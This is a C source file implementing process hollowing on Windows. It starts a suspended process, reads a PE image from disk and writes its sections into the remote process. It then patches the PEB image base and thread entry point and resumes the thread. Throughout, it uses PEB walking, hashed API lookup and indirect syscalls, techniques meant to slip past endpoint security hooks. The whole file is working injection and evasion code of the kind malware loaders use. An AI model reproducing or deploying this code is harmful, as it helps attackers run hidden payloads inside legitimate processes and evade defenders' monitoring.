#include "Box.h"

BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread
)
{

	BOOL State = TRUE;
	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		PRINT_ERROR("CreateProcessA");
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}

BOOL ReadTargetFile
(
	OUT LPVOID* lpBuffer,
	OUT DWORD* nNumberOfBytesToRead
)

{

	if (!lpBuffer || !nNumberOfBytesToRead)
		return FALSE;

	HANDLE hFile = NULL;
	BOOL State = TRUE;
	DWORD NumberOfBytesToRead = NULL;
	LPVOID lppBuffer = NULL;
	NTSTATUS status = NULL;
	FILE_STANDARD_INFORMATION fsi;
	IO_STATUS_BLOCK iosb = { 0 };
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	RtlInitUnicodeString g_RtlInitUnicodeString = (RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");

	UNICODE_STRING usPath;
	g_RtlInitUnicodeString(&usPath, L"\\??\\C:\\Windows\\System32\\calc.exe");

	INFO("Current Path: %wZ", &usPath);

	OBJECT_ATTRIBUTES OA;
	InitializeObjectAttributes(
		&OA,
		&usPath,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
	);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtCreateFile",
		"NtQueryInformationFile",
		"NtReadFile"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtCreateFile
	status = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG))SyscallInvoker)
		(&hFile, GENERIC_READ | SYNCHRONIZE, &OA, &iosb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT), NULL, 0);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtCreateFile");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Current File Handle", hFile);

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtQueryInformationFile
	status = ((NTSTATUS(*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS))SyscallInvoker)
		(hFile, &iosb, &fsi, sizeof(fsi), FileStandardInformation);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtQueryInformationFile");
		State = FALSE; goto CLEANUP;
	}

	SIZE_T fileSize = (SIZE_T)fsi.EndOfFile.QuadPart;
	INFO("[%ld] Current File Size", fileSize);


	if ((lppBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize)) == NULL)
	{
		PRINT_ERROR("HeapAlloc");
		State = FALSE; goto CLEANUP;
	}

	INFO("[%ld] Allocated Bytes to Buffer", fileSize);

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtReadFile
	status = ((NTSTATUS(*)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG))SyscallInvoker)
		(hFile, NULL, NULL, NULL, &iosb, lppBuffer, fileSize, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtReadFile");
		State = FALSE; goto CLEANUP;
	}

	SIZE_T bytesRead = iosb.Information;

	OKAY("[%zu] Successfully Read File!", fileSize);

	*lpBuffer = lppBuffer;
	*nNumberOfBytesToRead = (DWORD)bytesRead;

CLEANUP:

	return State;

}

BOOL GrabPeHeader
(
	OUT PIMAGE_NT_HEADERS* pImgNt,
	OUT PIMAGE_SECTION_HEADER* pImgSecHeader,
	OUT PIMAGE_DATA_DIRECTORY* pImgDataDir,
	IN LPVOID lpFile
)

{

	PBYTE pBase = (PBYTE)lpFile;

	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		PRINT_ERROR("Magic Letters");
		return;
	}

	PIMAGE_NT_HEADERS pImgNt64 = (PIMAGE_NT_HEADERS)((DWORD_PTR)pBase + pImgDos->e_lfanew);
	if (pImgNt64->Signature != IMAGE_NT_SIGNATURE)
	{
		PRINT_ERROR("Nt Signature");
		return;
	}

	PIMAGE_OPTIONAL_HEADER pImgOpt = &pImgNt64->OptionalHeader;

	PIMAGE_SECTION_HEADER pImgSecHead = IMAGE_FIRST_SECTION(pImgNt64);

	PIMAGE_DATA_DIRECTORY pImgDataDir64 = &pImgOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	*pImgNt = pImgNt64;
	*pImgSecHeader = pImgSecHead;
	*pImgDataDir = pImgDataDir64;

}

BOOL HollowExec
(
	IN HANDLE hProcess,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN LPVOID* rBuffer,
	IN PIMAGE_SECTION_HEADER pImgSecHeader,
	IN PIMAGE_DATA_DIRECTORY pImgDataDir,
	IN LPVOID lppBuffer
)

{

	if (!hProcess || !pImgNt || !rBuffer)
		return FALSE;

	BOOL State = TRUE;
	DWORD dwOldProt = NULL, dwDelta = NULL, RelocOffset = NULL;
	DWORD dwProt = NULL;
	SIZE_T lpNumOfBytesWritten = NULL;
	NTSTATUS status = NULL;
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	SIZE_T regionSize = pImgNt->OptionalHeader.SizeOfImage;
	PVOID  baseAddress = (PVOID)pImgNt->OptionalHeader.ImageBase;

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
	status = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
		(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtAllocateVirtualMemory");
		State = FALSE; goto CLEANUP;
	}

	*rBuffer = baseAddress;

	INFO("[0x%p] Remote Base Address", baseAddress);

	dwDelta = (DWORD)baseAddress - pImgNt->OptionalHeader.ImageBase;

	printf(
		"[v] [0x%p] Source Image Base\n"
		"[v] [0x%p] Dest Image Base\n"
		"[v] [0x%p] Relocation Delta\n",
		pImgNt->OptionalHeader.ImageBase,
		baseAddress,
		dwDelta
	);

	if (baseAddress != (LPVOID)pImgNt->OptionalHeader.ImageBase)
	{
		WARN("Image Base NOT The Same!");
		State = FALSE; goto CLEANUP;
	}

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
	status = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
		(hProcess, baseAddress, lppBuffer, pImgNt->OptionalHeader.SizeOfHeaders, &lpNumOfBytesWritten);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtWriteVirtualMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("Wrote Process Memory --> [0x%p] With Size --> [%d]", baseAddress, pImgNt->OptionalHeader.SizeOfHeaders);

	for (int i = 0; i < pImgNt->FileHeader.NumberOfSections; i++)
	{

		if (!pImgSecHeader[i].PointerToRawData)
			continue;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_EXECUTE_READWRITE;
			else
				dwProt = PAGE_EXECUTE_READ;
		}
		else {
			if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
				dwProt = PAGE_READWRITE;
			else
				dwProt = PAGE_READONLY;
		}

		PVOID SecBaseAddress = (PVOID)((PBYTE)baseAddress + pImgSecHeader[i].VirtualAddress);
		PVOID SecBuffer = (PVOID)((PBYTE)lppBuffer + pImgSecHeader[i].PointerToRawData);
		SIZE_T size = pImgSecHeader[i].Misc.VirtualSize;

		if (pImgSecHeader[i].SizeOfRawData) {

			SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
			status = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
				(hProcess, SecBaseAddress, SecBuffer, pImgSecHeader[i].SizeOfRawData, &lpNumOfBytesWritten);
			if (!NT_SUCCESS(status))
			{
				NTERROR("NtWriteVirtualMemory");
				State = FALSE; goto CLEANUP;
			}

		}

		SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
		status = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
			(hProcess, &SecBaseAddress, &size, dwProt, &dwOldProt);
		if (!NT_SUCCESS(status))
		{
			NTERROR("NtProtectVirtualMemory");
			State = FALSE; goto CLEANUP;
		}

		OKAY("Wrote [%s] section --> at [0x%p] Base Address With Size --> [%d]", pImgSecHeader[i].Name, SecBaseAddress, pImgSecHeader[i].SizeOfRawData);


	}

CLEANUP:

	return State;

}

BOOL GetThreadCtx
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN PIMAGE_NT_HEADERS pImgNt,
	IN LPVOID rBuffer
)

{

	if (!hThread || !rBuffer)
		return FALSE;

	BOOL State = TRUE;
	CONTEXT ThreadCtx;
	NTSTATUS status = NULL;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	ULONG suspendedCount = 0;
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtGetContextThread",
		"NtWriteVirtualMemory",
		"NtResumeThread",
		"NtWaitForSingleObject"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtGetContextThread
	status = ((NTSTATUS(*)(HANDLE, PCONTEXT))SyscallInvoker)
		(hThread, &ThreadCtx);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtGetContextThread");
		State = FALSE; goto CLEANUP;
	}


	INFO("[CTX @ 0x%p] Current Thread Context", &ThreadCtx);

	printf(
		"_______________\n"
		"| \n"
		"| [RAX]: [0x%016llX]\n"
		"| [RBX]: [0x%016llX]\n"
		"| [RCX]: [0x%016llX]\n"
		"| [RDX]: [0x%016llX]\n"
		"| [RSP]: [0x%016llX]\n"
		"| [RSI]: [0x%016llX]\n"
		"| [RDI]: [0x%016llX]\n"
		"| [RIP]: [0x%016llX]\n"
		"| \n"
		"_______________\n",
		ThreadCtx.Rax,
		ThreadCtx.Rbx,
		ThreadCtx.Rcx,
		ThreadCtx.Rdx,
		ThreadCtx.Rsp,
		ThreadCtx.Rsi,
		ThreadCtx.Rdi,
		ThreadCtx.Rip
	);

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
	status = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
		(hProcess, (PVOID)(ThreadCtx.Rdx + 0x10), &pImgNt->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtWriteVirtualMemory");
		State = FALSE; goto CLEANUP;
	}

	INFO("[RCX] --> [0x%p] Updating Count Instruction...", (PVOID)ThreadCtx.Rcx);

	ThreadCtx.Rcx = (LPVOID)((PBYTE)rBuffer + pImgNt->OptionalHeader.AddressOfEntryPoint);

	/*status = NtSetContextThread(hThread, &ThreadCtx);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtSetContextThread");
		State = FALSE; goto CLEANUP;
	}*/

	if (!SetThreadContext(hThread, &ThreadCtx))
	{
		PRINT_ERROR("SetThreadContext");
		State = FALSE; goto CLEANUP;
	}

	OKAY("[RCX] --> [0x%p] Instruction Updated... Pointing to out Allocated Buffer --> [0x%p]", (PVOID*)ThreadCtx.Rcx, rBuffer);

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtResumeThread
	status = ((NTSTATUS(*)(HANDLE, PULONG))SyscallInvoker)
		(hThread, &suspendedCount);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtResumeThread");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] waiting for thread to finish execution...", hThread);

	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtWaitForSingleObject
	status = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
		(hThread, FALSE, NULL);
	if (!NT_SUCCESS(status))
	{
		NTERROR("NtWaitForSingleObject");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] thread finished execution! beginning cleanup...", hThread);

CLEANUP:

	return State;

}